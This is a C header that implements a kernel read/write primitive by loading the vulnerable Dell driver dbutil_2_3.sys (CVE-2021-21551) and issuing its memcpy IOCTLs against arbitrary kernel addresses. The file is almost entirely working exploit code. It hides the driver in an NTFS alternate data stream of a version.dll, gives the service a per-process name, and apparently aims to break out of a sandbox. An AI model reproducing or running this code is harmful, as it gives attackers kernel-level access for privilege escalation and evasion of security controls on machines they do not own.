/*
 * kdrv.h - kernel R/W primitive via dbutil_2_3.sys (CVE-2021-21551)
 *
 * Loads the Dell-signed driver as a service, opens the device, and
 * provides virtual kernel memory read/write through IOCTLs.
 *
 * The driver binary is stored in an NTFS ADS (version.dll:driver) and
 * loaded from there.  The device name is hardcoded in the driver.
 *
 * Never stop/delete the service while the driver is live (causes BSOD).
 * Just close handles — stale service is cleaned on next load after reboot.
 */
#ifndef KDRV_H
#define KDRV_H

#include <windows.h>
#include <winioctl.h>
#include "log.h"

/* Device name is hardcoded in the driver, independent of service name. */
#define KDRV_DEVICE   L"\\\\.\\DBUtil_2_3"

/* IOCTLs from reverse-engineering sub_11170 in dbutil_2_3.sys. */
#define KDRV_IOCTL_R  0x9B0C1EC4   /* memcpy read  (sub_15294, a2=0) */
#define KDRV_IOCTL_W  0x9B0C1EC8   /* memcpy write (sub_15294, a2=1) */
#define KDRV_HDR      24           /* 3 x uint64: cookie, base, offset */

typedef struct {
    SC_HANDLE hScm;
    SC_HANDLE hSvc;
    HANDLE    hDev;
    char      driverPath[MAX_PATH];  /* ADS path to driver binary */
} kdrv_t;

/* Unique service name per process to avoid stale service conflicts. */
static char g_svc_name[64];

/* ------------------------------------------------------------------ */

/* Read *size* bytes from kernel virtual address *va*. Returns 0 on success. */
static int kdrv_read(kdrv_t *d, ULONG64 va, void *out, ULONG size)
{
    ULONG bufLen = KDRV_HDR + size;
    BYTE *buf = (BYTE *)HeapAlloc(GetProcessHeap(), 0, bufLen);
    if (!buf) return 1;

    *(ULONG64 *)(buf + 0)  = 0;   /* cookie = 0 (check skipped) */
    *(ULONG64 *)(buf + 8)  = va;
    *(ULONG64 *)(buf + 16) = 0;

    ULONG returned = 0;
    BOOL ok = DeviceIoControl(d->hDev, KDRV_IOCTL_R, buf, bufLen,
                              buf, bufLen, &returned, NULL);
    if (!ok || returned < KDRV_HDR + size) {
        HeapFree(GetProcessHeap(), 0, buf);
        return 2;
    }
    memcpy(out, buf + KDRV_HDR, size);
    HeapFree(GetProcessHeap(), 0, buf);
    return 0;
}

/* Write *data* to kernel virtual address *va*. Returns 0 on success. */
static int kdrv_write(kdrv_t *d, ULONG64 va, const void *data, ULONG size)
{
    ULONG bufLen = KDRV_HDR + size;
    BYTE *buf = (BYTE *)HeapAlloc(GetProcessHeap(), 0, bufLen);
    if (!buf) return 1;

    *(ULONG64 *)(buf + 0)  = 0;
    *(ULONG64 *)(buf + 8)  = va;
    *(ULONG64 *)(buf + 16) = 0;
    memcpy(buf + KDRV_HDR, data, size);

    ULONG returned = 0;
    BOOL ok = DeviceIoControl(d->hDev, KDRV_IOCTL_W, buf, bufLen,
                              buf, bufLen, &returned, NULL);
    HeapFree(GetProcessHeap(), 0, buf);
    return ok ? 0 : 2;
}

/* Try to open the device if the driver is already running. */
static BOOL kdrv_try_open_device(kdrv_t *d)
{
    d->hDev = CreateFileW(KDRV_DEVICE, GENERIC_READ | GENERIC_WRITE,
                          0, NULL, OPEN_EXISTING, 0, NULL);
    if (d->hDev != INVALID_HANDLE_VALUE)
        return TRUE;
    d->hDev = NULL;
    return FALSE;
}

/* Delete a stale service if it's STOPPED. RUNNING services are left
 * alone (device is reused via fast path). */
static void kdrv_cleanup_stale(SC_HANDLE hScm)
{
    SC_HANDLE hOld = OpenServiceA(hScm, g_svc_name, SERVICE_ALL_ACCESS);
    if (!hOld) return;

    SERVICE_STATUS st;
    if (QueryServiceStatus(hOld, &st) && st.dwCurrentState == SERVICE_STOPPED) {
        DeleteService(hOld);
        Sleep(300);
    }
    CloseServiceHandle(hOld);
}

/* Load the driver: opens device if already running, otherwise creates
 * a service and starts it.  The driver file must already exist at the
 * NTFS ADS path (version.dll:driver).  Returns 0 on success. */
static int kdrv_load(kdrv_t *d)
{
    memset(d, 0, sizeof(*d));

    /* Fast path: device already exists from a prior run */
    if (kdrv_try_open_device(d))
        return 0;

    /* Unique service name per process */
    wsprintfA(g_svc_name, "sbie_unlock_%lu", GetCurrentProcessId());

    /* Resolve driver path from NTFS ADS of our DLL */
    HMODULE hSelf = GetModuleHandleA("version.dll");
    if (hSelf) {
        GetModuleFileNameA(hSelf, d->driverPath, MAX_PATH);
        strcat_s(d->driverPath, MAX_PATH, ":driver");
    }
    if (!d->driverPath[0] ||
        GetFileAttributesA(d->driverPath) == INVALID_FILE_ATTRIBUTES) {
        LOGE("Driver ADS not found — extract_driver must run first");
        return 1;
    }

    d->hScm = OpenSCManagerA(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
    if (!d->hScm) {
        LOGE("OpenSCManager failed: %lu", GetLastError());
        return 2;
    }

    kdrv_cleanup_stale(d->hScm);

    d->hSvc = CreateServiceA(d->hScm, g_svc_name, g_svc_name,
                             SERVICE_ALL_ACCESS, SERVICE_KERNEL_DRIVER,
                             SERVICE_DEMAND_START, SERVICE_ERROR_NORMAL,
                             d->driverPath, NULL, NULL, NULL, NULL, NULL);
    if (!d->hSvc) {
        DWORD err = GetLastError();
        LOGE("CreateService failed: %lu", err);
        if (err == ERROR_SERVICE_MARKED_FOR_DELETE) {
            Sleep(1000);
            d->hSvc = CreateServiceA(d->hScm, g_svc_name, g_svc_name,
                                     SERVICE_ALL_ACCESS, SERVICE_KERNEL_DRIVER,
                                     SERVICE_DEMAND_START, SERVICE_ERROR_NORMAL,
                                     d->driverPath, NULL, NULL, NULL, NULL, NULL);
        }
        if (!d->hSvc) {
            CloseServiceHandle(d->hScm);
            d->hScm = NULL;
            return 3;
        }
    }

    if (!StartServiceA(d->hSvc, 0, NULL)) {
        DWORD err = GetLastError();
        if (err == ERROR_ALREADY_EXISTS || err == ERROR_SERVICE_MARKED_FOR_DELETE) {
            if (kdrv_try_open_device(d)) return 0;
            Sleep(2000);
            if (kdrv_try_open_device(d)) return 0;
        }
        if (err != ERROR_SERVICE_ALREADY_RUNNING) {
            CloseServiceHandle(d->hSvc);
            CloseServiceHandle(d->hScm);
            d->hSvc = NULL;
            d->hScm = NULL;
            return 4;
        }
    }

    /* Wait for device to appear */
    for (int i = 0; i < 20; i++) {
        if (kdrv_try_open_device(d))
            return 0;
        Sleep(100);
    }
    return 5;
}

/* Unload: close handles only. Never stop/delete while live (BSOD risk). */
static void kdrv_unload(kdrv_t *d)
{
    if (d->hDev) { CloseHandle(d->hDev); d->hDev = NULL; }
    if (d->hSvc) { CloseServiceHandle(d->hSvc); d->hSvc = NULL; }
    if (d->hScm) { CloseServiceHandle(d->hScm); d->hScm = NULL; }
    /* Do NOT delete the ADS — it lives with version.dll. */
}

#endif /* KDRV_H */
